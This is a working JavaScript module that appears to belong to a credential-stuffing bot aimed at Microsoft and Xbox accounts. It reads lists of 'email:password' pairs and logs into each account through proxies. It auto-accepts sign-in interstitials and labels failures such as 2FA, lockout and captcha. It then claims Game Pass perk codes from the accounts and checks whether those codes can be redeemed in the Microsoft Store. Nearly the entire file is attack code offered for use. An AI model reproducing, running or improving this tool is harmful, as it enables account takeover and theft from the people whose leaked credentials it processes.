// ============================================================
//  Xbox Code Fetcher + Validator (PrepareRedeem)
//  Hardened login: ports the AIO inboxer's resilience into the
//  MBI_SSL desktop OAuth flow so 2FA / KMSI / consent / abuse /
//  privacy notices are detected and labelled instead of silently
//  dropped.
//
//  Flow:
//   1. IDP precheck (skip non-MSAccount emails fast)
//   2. login.live.com OAuth20 authorize (MBI_SSL scope, RPS ticket)
//   3. POST credentials → label outcome (bad_creds / 2fa /
//      consent / kmsi / abuse / locked / network)
//   4. Auto-handle KMSI ("stay signed in") + cancel?mkt= consent
//   5. Extract access_token from URL fragment (Xbox RPS ticket)
//   6. XBL → XSTS → fetch perks / claim offers
//   7. Validate codes via WLID checker (unchanged)
// ============================================================

const crypto = require("crypto");
const { checkCodes } = require("./microsoft-checker");
const { getWlids } = require("./wlid-store");
const { proxiedFetch } = require("./proxy-manager");
const { runQueue } = require("./account-queue");

// ── Code Format Validation ──────────────────────────────────

const INVALID_CHARS = new Set(["A", "E", "I", "O", "U", "L", "S", "0", "1", "5"]);

function isInvalidCodeFormat(code) {
  if (!code || code.length < 5 || code.includes(" ")) return true;
  for (const char of code) {
    if (INVALID_CHARS.has(char)) return true;
  }
  return false;
}

// ── Cookie-aware fetch ──────────────────────────────────────

function extractCookiesFromResponse(res, cookieJar) {
  const setCookies = res.headers.getSetCookie?.() || [];
  for (const c of setCookies) {
    const parts = c.split(";")[0].trim();
    if (parts.includes("=")) cookieJar.push(parts);
  }
}

function getCookieString(cookieJar) {
  return cookieJar.join("; ");
}

async function sessionFetch(url, options, cookieJar) {
  let currentUrl = url;
  let method = options.method || "GET";
  let body = options.body;
  let maxRedirects = 15;

  while (maxRedirects-- > 0) {
    const res = await proxiedFetch(currentUrl, {
      ...options,
      method,
      body,
      headers: { ...options.headers, Cookie: getCookieString(cookieJar) },
      redirect: "manual",
    });

    extractCookiesFromResponse(res, cookieJar);

    const status = res.status;
    if (status >= 300 && status < 400) {
      const location = res.headers.get("location");
      if (!location) break;
      currentUrl = new URL(location, currentUrl).href;
      if (status !== 307 && status !== 308) { method = "GET"; body = undefined; }
      try { await res.text(); } catch {}
      continue;
    }

    const text = await res.text();
    return { res, text, finalUrl: currentUrl };
  }

  throw new Error("Too many redirects");
}

// ── IDP Precheck (ported from AIO inboxer) ──────────────────

async function idpPrecheck(email) {
  try {
    const url = `https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=${encodeURIComponent(email)}`;
    const r = await proxiedFetch(url, {
      headers: {
        "X-OneAuth-AppName": "Outlook Lite",
        "X-Office-Version": "3.11.0-minApi24",
        "X-CorrelationId": crypto.randomUUID(),
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N)",
        "Accept-Encoding": "gzip",
      },
      signal: AbortSignal.timeout(12000),
    });
    const t = await r.text();
    if (["Neither", "Both", "Placeholder", "OrgId"].some(x => t.includes(x))) {
      return { ok: false, reason: "idp_failed" };
    }
    if (!t.includes("MSAccount")) return { ok: false, reason: "not_msaccount" };
    return { ok: true };
  } catch {
    // Don't block on precheck failure — just continue
    return { ok: true, soft: true };
  }
}

// ── Xbox Live OAuth Login ───────────────────────────────────

const MICROSOFT_OAUTH_URL =
  "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en";

async function fetchOAuthTokens(session) {
  try {
    const { text } = await sessionFetch(MICROSOFT_OAUTH_URL, {
      headers: session.headers,
    }, session.cookies);

    // Robust PPFT extraction (multiple patterns from AIO)
    let ppft = null;
    let m = text.match(/name="PPFT"[^>]*value="([^"]+)"/);
    if (m) ppft = m[1];
    if (!ppft) { m = text.match(/sFTTag:'<input.*?value="(.+?)"/); if (m) ppft = m[1]; }
    if (!ppft) { m = text.match(/value="([^"]{200,})"/); if (m) ppft = m[1]; }

    let urlPost = null;
    m = text.match(/urlPost:'([^']+)'/);
    if (m) urlPost = m[1];
    if (!urlPost) { m = text.match(/"urlPost":"([^"]+)"/); if (m) urlPost = m[1].replace(/\\\//g, "/"); }

    if (!ppft || !urlPost) return { urlPost: null, ppft: null, reason: "ppft_extraction_failed" };
    return { urlPost, ppft };
  } catch (e) {
    return { urlPost: null, ppft: null, reason: `network:${e.message}` };
  }
}

function extractTokenFromFragment(url) {
  if (!url || !url.includes("#")) return null;
  try {
    const hash = new URL(url).hash.substring(1);
    const params = new URLSearchParams(hash);
    const token = params.get("access_token");
    if (token && token !== "None") return token;
  } catch {}
  return null;
}

async function handleKmsi(session, text) {
  // KMSI ("stay signed in") interstitial
  if (!text || !text.includes("KmsiInterrupt")) return null;
  try {
    const ipt = text.match(/name="ipt"\s+value="([^"]+)"/)?.[1];
    const pprid = text.match(/name="pprid"\s+value="([^"]+)"/)?.[1];
    const uaid = text.match(/name="uaid"\s+value="([^"]+)"/)?.[1];
    const action = text.match(/id="fmHF"\s+action="([^"]+)"/)?.[1];
    const optInVal = text.match(/name="LoginOptions"\s+value="([^"]+)"/)?.[1] || "1";
    if (!action) return null;
    const body = new URLSearchParams({
      LoginOptions: optInVal,
      ipt: ipt || "",
      pprid: pprid || "",
      uaid: uaid || "",
      type: "28",
    });
    const { finalUrl } = await sessionFetch(action, {
      method: "POST",
      headers: { ...session.headers, "Content-Type": "application/x-www-form-urlencoded" },
      body: body.toString(),
    }, session.cookies);
    return extractTokenFromFragment(finalUrl);
  } catch { return null; }
}

async function handleConsentCancel(session, text) {
  // The classic "cancel?mkt=" privacy/consent reconsent flow
  if (!text || !text.includes("cancel?mkt=")) return null;
  try {
    const ipt = text.match(/(?<="ipt" value=").+?(?=">)/)?.[0];
    const pprid = text.match(/(?<="pprid" value=").+?(?=">)/)?.[0];
    const uaid = text.match(/(?<="uaid" value=").+?(?=">)/)?.[0];
    const action = text.match(/(?<=id="fmHF" action=").+?(?=" )/)?.[0];
    if (!ipt || !pprid || !uaid || !action) return null;

    const body = new URLSearchParams({ ipt, pprid, uaid });
    const { text: retText } = await sessionFetch(action, {
      method: "POST",
      headers: { ...session.headers, "Content-Type": "application/x-www-form-urlencoded" },
      body: body.toString(),
    }, session.cookies);

    const ret = retText.match(/(?<="recoveryCancel":\{"returnUrl":")(.+?)(?=",)/)?.[0];
    if (!ret) return null;
    const { finalUrl } = await sessionFetch(ret, { headers: session.headers }, session.cookies);
    return extractTokenFromFragment(finalUrl);
  } catch { return null; }
}

function classifyLoginFailure(text) {
  if (!text) return "unknown";
  if (/account or password is incorrect|sign-in name or password/i.test(text)) return "bad_creds";
  if (/identity\/confirm|identity\.live\.com\/confirm|proofs\/Add/i.test(text)) return "2fa";
  if (/account\.live\.com\/Abuse/i.test(text)) return "abuse";
  if (/account\.live\.com\/RecoverAccount|recover\?/i.test(text)) return "locked";
  if (/CAPTCHA|arkoselabs|hcaptcha|recaptcha/i.test(text)) return "captcha";
  if (/Help us protect your account/i.test(text)) return "2fa";
  if (/begin\.srf|UpdateCredentials/i.test(text)) return "consent";
  return "unknown";
}

async function fetchLogin(session, email, password, urlPost, ppft) {
  try {
    const body = new URLSearchParams({
      login: email,
      loginfmt: email,
      passwd: password,
      PPFT: ppft,
      LoginOptions: "3",
      type: "11",
    });

    const { text, finalUrl } = await sessionFetch(urlPost, {
      method: "POST",
      headers: { ...session.headers, "Content-Type": "application/x-www-form-urlencoded" },
      body: body.toString(),
    }, session.cookies);

    // 1. Direct token in fragment
    const direct = extractTokenFromFragment(finalUrl);
    if (direct) return { token: direct };

    // 2. KMSI interrupt — auto-accept
    const kmsi = await handleKmsi(session, text);
    if (kmsi) return { token: kmsi };

    // 3. Consent / cancel?mkt= page
    const consent = await handleConsentCancel(session, text);
    if (consent) return { token: consent };

    // 4. Classify failure properly instead of silent null
    return { token: null, reason: classifyLoginFailure(text) };
  } catch (e) {
    return { token: null, reason: `network:${(e.message || "?").slice(0, 60)}` };
  }
}

async function getXboxTokens(rpsToken) {
  try {
    const userRes = await proxiedFetch("https://user.auth.xboxlive.com/user/authenticate", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        RelyingParty: "http://auth.xboxlive.com",
        TokenType: "JWT",
        Properties: { AuthMethod: "RPS", SiteName: "user.auth.xboxlive.com", RpsTicket: rpsToken },
      }),
    });
    if (userRes.status !== 200) return { uhs: null, xstsToken: null };
    const userData = await userRes.json();
    const userToken = userData.Token;

    const xstsRes = await proxiedFetch("https://xsts.auth.xboxlive.com/xsts/authorize", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        RelyingParty: "http://xboxlive.com",
        TokenType: "JWT",
        Properties: { UserTokens: [userToken], SandboxId: "RETAIL" },
      }),
    });
    if (xstsRes.status !== 200) return { uhs: null, xstsToken: null };
    const xstsData = await xstsRes.json();
    const uhs = xstsData.DisplayClaims?.xui?.[0]?.uhs || null;
    return { uhs, xstsToken: xstsData.Token };
  } catch {
    return { uhs: null, xstsToken: null };
  }
}

function isLink(resource) {
  return resource && (resource.startsWith("http://") || resource.startsWith("https://"));
}

async function fetchCodesFromXbox(uhs, xstsToken) {
  try {
    const auth = `XBL3.0 x=${uhs};${xstsToken}`;
    const baseHeaders = {
      Authorization: auth,
      "Content-Type": "application/json",
      "User-Agent": "okhttp/4.12.0",
    };

    let data = null;
    for (const ver of ["v3", "v2"]) {
      try {
        const res = await proxiedFetch(`https://profile.gamepass.com/${ver}/offers`, { headers: baseHeaders });
        if (res.status === 200) {
          data = await res.json();
          if (data && (data.offers?.length > 0 || data.perks?.length > 0)) break;
        }
      } catch {}
    }
    if (!data) return { codes: [], links: [] };

    const codes = [];
    const links = [];
    const offerList = data.offers || data.perks || [];
    for (const offer of offerList) {
      const resource = offer.resource || offer.code || offer.redemptionUrl || offer.url || null;
      if (resource) {
        if (isLink(resource)) links.push(resource); else codes.push(resource);
        continue;
      }

      if (offer.offerStatus === "available" || offer.status === "available" || offer.claimable) {
        const offerId = offer.offerId || offer.id;
        if (!offerId) continue;
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let cv = "";
        for (let i = 0; i < 22; i++) cv += chars[Math.floor(Math.random() * chars.length)];
        cv += ".0";

        try {
          const claimRes = await proxiedFetch(`https://profile.gamepass.com/v2/offers/${offerId}`, {
            method: "POST",
            headers: { ...baseHeaders, "ms-cv": cv, "Content-Length": "0" },
            body: "",
          });
          if (claimRes.status === 200) {
            const claimData = await claimRes.json();
            const claimedResource = claimData.resource || claimData.code || claimData.redemptionUrl || null;
            if (claimedResource) {
              if (isLink(claimedResource)) links.push(claimedResource); else codes.push(claimedResource);
            }
          }
        } catch {}
      }
    }
    return { codes, links };
  } catch {
    return { codes: [], links: [] };
  }
}

// ── Store Login + PrepareRedeem (UNCHANGED — works fine) ───

async function loginMicrosoftStore(email, password) {
  const headers = {
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
    Accept:
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "en-US,en;q=0.9",
    Referer: "https://account.microsoft.com/",
    Origin: "https://account.microsoft.com",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
  };

  let cookieJar = "";
  function extractCookies(res) {
    const sc = res.headers.getSetCookie?.() || [];
    for (const c of sc) {
      const parts = c.split(";")[0].trim();
      if (parts.includes("=")) cookieJar += "; " + parts;
    }
  }
  async function storeGet(url) {
    const res = await proxiedFetch(url, { headers: { ...headers, Cookie: cookieJar }, redirect: "follow" });
    extractCookies(res);
    return { res, text: await res.text() };
  }
  async function storePost(url, body, extraHeaders = {}) {
    const res = await proxiedFetch(url, {
      method: "POST",
      headers: { ...headers, Cookie: cookieJar, ...extraHeaders },
      body,
      redirect: "follow",
    });
    extractCookies(res);
    return { res, text: await res.text() };
  }

  try {
    const bk = Math.floor(Date.now() / 1000);
    const loginUrl = `https://login.live.com/ppsecure/post.srf?username=${encodeURIComponent(email)}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=${bk}&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none`;

    const { text: loginText } = await storePost(
      loginUrl,
      new URLSearchParams({
        login: email, loginfmt: email, passwd: password,
        PPFT: "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$",
      }).toString(),
      { "Content-Type": "application/x-www-form-urlencoded" }
    );

    const cleaned = loginText.replace(/\\/g, "");
    const reurlMatch = cleaned.match(/replace\("([^"]+)"/);
    if (!reurlMatch) return null;

    const { text: reresp } = await storeGet(reurlMatch[1]);
    const actionMatch = reresp.match(/<form.*?action="(.*?)".*?>/);
    if (!actionMatch) return null;

    const inputMatches = [...reresp.matchAll(/<input.*?name="(.*?)".*?value="(.*?)".*?>/g)];
    const formData = new URLSearchParams();
    for (const m of inputMatches) formData.append(m[1], m[2]);

    await storePost(actionMatch[1], formData.toString(), { "Content-Type": "application/x-www-form-urlencoded" });
    return { cookieJar, headers };
  } catch { return null; }
}

function generateReferenceId() {
  const timestampVal = Math.floor(Date.now() / 30000);
  const n = timestampVal.toString(16).toUpperCase().padStart(8, "0");
  const o = (crypto.randomUUID().replace(/-/g, "") + crypto.randomUUID().replace(/-/g, "")).toUpperCase();
  const result = [];
  for (let e = 0; e < 64; e++) {
    if (e % 8 === 1) result.push(n[Math.floor((e - 1) / 8)] || "0");
    else result.push(o[e] || "0");
  }
  return result.join("");
}

async function getStoreAuthToken(cookieJar, headers) {
  try {
    await proxiedFetch("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", {
      headers: { ...headers, Cookie: cookieJar },
    }).catch(() => {});

    const tokenRes = await proxiedFetch(
      "https://account.microsoft.com/auth/acquire-onbehalf-of-token?scopes=MSComServiceMBISSL",
      {
        headers: {
          Accept: "application/json", "Content-Type": "application/json",
          "X-Requested-With": "XMLHttpRequest",
          "Cache-Control": "no-cache", Pragma: "no-cache",
          Referer: "https://account.microsoft.com/billing/redeem",
          "User-Agent": headers["User-Agent"], Cookie: cookieJar,
        },
      }
    );
    if (tokenRes.status !== 200) return null;
    const data = await tokenRes.json();
    if (!data || !data[0]?.token) return null;
    return data[0].token;
  } catch { return null; }
}

async function getStoreCartState(token, cookieJar, headers) {
  try {
    const msCv = "xddT7qMNbECeJpTq.6.2";
    const payload = new URLSearchParams({
      data: '{"usePurchaseSdk":true}', market: "US", cV: msCv, locale: "en-GB",
      msaTicket: token, pageFormat: "full",
      urlRef: "https://account.microsoft.com/billing/redeem",
      isRedeem: "true", clientType: "AccountMicrosoftCom",
      layout: "Inline", cssOverride: "AMC", scenario: "redeem",
      timeToInvokeIframe: "4977", sdkVersion: "VERSION_PLACEHOLDER",
    });

    const res = await proxiedFetch(
      `https://www.microsoft.com/store/purchase/buynowui/redeemnow?ms-cv=${msCv}&market=US&locale=en-GB&clientName=AccountMicrosoftCom`,
      {
        method: "POST",
        headers: { ...headers, Cookie: cookieJar, "Content-Type": "application/x-www-form-urlencoded" },
        body: payload.toString(),
      }
    );

    const text = await res.text();
    const match = text.match(/window\.__STORE_CART_STATE__=({.*?});/s);
    if (!match) return null;

    const storeState = JSON.parse(match[1]);
    return {
      ms_cv: storeState.appContext?.cv || "",
      correlation_id: storeState.appContext?.correlationId || "",
      tracking_id: storeState.appContext?.trackingId || "",
      vector_id: storeState.appContext?.muid || "",
      muid: storeState.appContext?.alternativeMuid || "",
    };
  } catch { return null; }
}

async function validateCodePrepareRedeem(code, token, storeState, cookieJar, userAgent) {
  if (isInvalidCodeFormat(code)) return { code, status: "INVALID", message: `${code} | INVALID` };

  const hdrs = {
    host: "buynow.production.store-web.dynamics.com",
    connection: "keep-alive",
    "x-ms-tracking-id": storeState.tracking_id,
    "sec-ch-ua-platform": '"Windows"',
    authorization: `WLID1.0=t=${token}`,
    "x-ms-client-type": "AccountMicrosoftCom",
    "x-ms-market": "US",
    "sec-ch-ua": '"Chromium";v="142", "Microsoft Edge";v="142", "Not_A Brand";v="99"',
    "ms-cv": storeState.ms_cv,
    "sec-ch-ua-mobile": "?0",
    "x-ms-reference-id": generateReferenceId(),
    "x-ms-vector-id": storeState.vector_id,
    "user-agent": userAgent,
    "x-ms-correlation-id": storeState.correlation_id,
    "content-type": "application/json",
    "x-authorization-muid": storeState.muid,
    accept: "*/*",
    Cookie: cookieJar,
  };

  try {
    const res = await proxiedFetch(
      "https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken",
      { method: "POST", headers: hdrs, body: JSON.stringify({}) }
    );
    if (res.status === 429) return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };
    if (res.status !== 200) return { code, status: "ERROR", message: `${code} | HTTP ${res.status}` };

    const data = await res.json();
    if (data.tokenType === "CSV") return { code, status: "BALANCE_CODE", message: `${code} | ${data.value} ${data.currency}` };
    if (data.errorCode === "TooManyRequests") return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };
    if (data.error?.code === "TooManyRequests") return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };

    if (data.events?.cart?.[0]) {
      const cart = data.events.cart[0];
      if (cart.type === "error") {
        if (String(cart.code).includes("TooManyRequests") || String(cart).includes("TooManyRequests"))
          return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };
        const reason = cart.data?.reason;
        if (reason) {
          if (reason.includes("TooManyRequests") || reason.includes("RateLimit")) return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };
          if (reason === "RedeemTokenAlreadyRedeemed") return { code, status: "REDEEMED", message: `${code} | REDEEMED` };
          if (["RedeemTokenExpired", "LegacyTokenAuthenticationNotProvided", "RedeemTokenNoMatchingOrEligibleProductsFound"].includes(reason)) return { code, status: "EXPIRED", message: `${code} | EXPIRED` };
          if (reason === "RedeemTokenStateDeactivated") return { code, status: "DEACTIVATED", message: `${code} | DEACTIVATED` };
          if (reason === "RedeemTokenGeoFencingError") return { code, status: "REGION_LOCKED", message: `${code} | REGION_LOCKED` };
          if (["RedeemTokenNotFound", "InvalidProductKey", "RedeemTokenStateUnknown"].includes(reason)) return { code, status: "INVALID", message: `${code} | INVALID` };
          return { code, status: "INVALID", message: `${code} | INVALID` };
        }
      }
    }

    if (data.products?.length > 0) {
      const productInfo = data.productInfos?.[0] || {};
      const productId = productInfo.productId;
      for (const product of data.products) {
        if (product.id === productId) {
          const title = product.sku?.title || product.title || "Unknown Title";
          const isPIRequired = productInfo.isPIRequired || false;
          const status = isPIRequired ? "VALID_REQUIRES_CARD" : "VALID";
          return { code, status, title, message: `${code} | ${title}` };
        }
      }
    }
    return { code, status: "UNKNOWN", message: `${code} | UNKNOWN` };
  } catch (err) {
    return { code, status: "ERROR", message: `${code} | ${err.message}` };
  }
}

// ── Main Pull Pipeline ───────────────────────────────────────

async function fetchFromAccount(email, password) {
  const session = {
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
    },
    cookies: [],
  };

  try {
    // 0. IDP precheck — fast-skip dead/non-MSAccount emails
    const idp = await idpPrecheck(email);
    if (!idp.ok) return { email, codes: [], links: [], error: idp.reason };

    const { urlPost, ppft, reason: oauthReason } = await fetchOAuthTokens(session);
    if (!urlPost) return { email, codes: [], links: [], error: oauthReason || "oauth_failed" };

    const { token, reason: loginReason } = await fetchLogin(session, email, password, urlPost, ppft);
    if (!token) return { email, codes: [], links: [], error: loginReason || "login_failed" };

    const { uhs, xstsToken } = await getXboxTokens(token);
    if (!uhs) return { email, codes: [], links: [], error: "xbox_tokens_failed" };

    const { codes, links } = await fetchCodesFromXbox(uhs, xstsToken);
    return { email, codes, links };
  } catch (err) {
    return { email, codes: [], links: [], error: `network:${(err.message || "?").slice(0, 60)}` };
  }
}

async function validateCodesWithStore(email, password, codes, onProgress) {
  const storeSession = await loginMicrosoftStore(email, password);
  if (!storeSession) return codes.map((c) => ({ code: c, status: "ERROR", message: `${c} | Store login failed` }));

  const token = await getStoreAuthToken(storeSession.cookieJar, storeSession.headers);
  if (!token) return codes.map((c) => ({ code: c, status: "ERROR", message: `${c} | Token failed` }));

  const storeState = await getStoreCartState(token, storeSession.cookieJar, storeSession.headers);
  if (!storeState) return codes.map((c) => ({ code: c, status: "ERROR", message: `${c} | Store state failed` }));

  const results = [];
  for (let i = 0; i < codes.length; i++) {
    const result = await validateCodePrepareRedeem(
      codes[i], token, storeState, storeSession.cookieJar, storeSession.headers["User-Agent"]
    );
    results.push(result);
    if (onProgress) onProgress(i + 1, codes.length);

    if (result.status === "RATE_LIMITED") {
      for (let j = i + 1; j < codes.length; j++) {
        results.push({ code: codes[j], status: "SKIPPED", message: `${codes[j]} | Skipped (rate limited)` });
      }
      break;
    }
  }
  return results;
}

// Transient errors → retry; everything else (bad_creds, 2fa, abuse, etc.) is final.
const TRANSIENT_ERRORS = new Set(["oauth_failed", "ppft_extraction_failed", "xbox_tokens_failed"]);
function isTransient(err) {
  if (!err) return false;
  if (TRANSIENT_ERRORS.has(err)) return true;
  return err.startsWith("network:");
}

async function pullCodes(accounts, onProgress, signal) {
  const parsed = accounts.map((a) => {
    const i = a.indexOf(":");
    return i === -1 ? { email: a, password: "" } : { email: a.substring(0, i), password: a.substring(i + 1) };
  });

  const fetchResults = [];
  const allCodes = [];

  await runQueue({
    items: parsed,
    concurrency: 3,
    maxRetries: 2,
    signal,
    runner: async ({ email, password }, attempt) => {
      const result = await fetchFromAccount(email, password);
      if (isTransient(result.error) && attempt < 2) return { retry: true };

      const codes = result.codes || [];
      const links = result.links || [];
      fetchResults.push({ email: result.email, codes: [...codes], links, error: result.error });
      for (const c of codes) allCodes.push({ code: c, sourceEmail: result.email });

      if (onProgress) {
        onProgress("fetch", {
          email, codes: codes.length, error: result.error,
          done: fetchResults.length, total: parsed.length,
        });
      }
      return { result };
    },
  });

  if (signal && signal.aborted) return { fetchResults, validateResults: [] };
  if (allCodes.length === 0) return { fetchResults, validateResults: [] };

  const wlids = getWlids();
  if (wlids.length === 0) {
    const validateResults = allCodes.map(({ code, sourceEmail }) => ({
      code, sourceEmail, status: "error",
      message: `${code} | No WLIDs stored — use .wlidset first`,
    }));
    return { fetchResults, validateResults };
  }

  if (onProgress) onProgress("validate_start", { total: allCodes.length, fetchResults });

  const codeIndex = new Map();
  allCodes.forEach((entry) => codeIndex.set(entry.code, entry.sourceEmail));

  const validateResults = await checkCodes(wlids, allCodes.map(c => c.code), 10, (done, total, lastResult) => {
    if (onProgress) onProgress("validate", { done, total, status: lastResult?.status });
  }, signal);

  for (const r of validateResults) r.sourceEmail = codeIndex.get(r.code) || "";
  return { fetchResults, validateResults };
}

async function pullLinks(accounts, onProgress, signal) {
  const parsed = accounts.map((a) => {
    const i = a.indexOf(":");
    return i === -1 ? { email: a, password: "" } : { email: a.substring(0, i), password: a.substring(i + 1) };
  });

  const allLinks = [];
  const fetchResults = [];

  await runQueue({
    items: parsed,
    concurrency: 3,
    maxRetries: 2,
    signal,
    runner: async ({ email, password }, attempt) => {
      const result = await fetchFromAccount(email, password);
      if (isTransient(result.error) && attempt < 2) return { retry: true };

      const links = result.links || [];
      fetchResults.push({ email: result.email, links, error: result.error });
      for (const l of links) allLinks.push({ link: l, sourceEmail: result.email });

      if (onProgress) {
        onProgress("fetch", {
          email, links: links.length, error: result.error,
          done: fetchResults.length, total: parsed.length,
        });
      }
      return { result };
    },
  });

  return { fetchResults, allLinks };
}

module.exports = { pullCodes, pullLinks, fetchFromAccount, validateCodesWithStore };
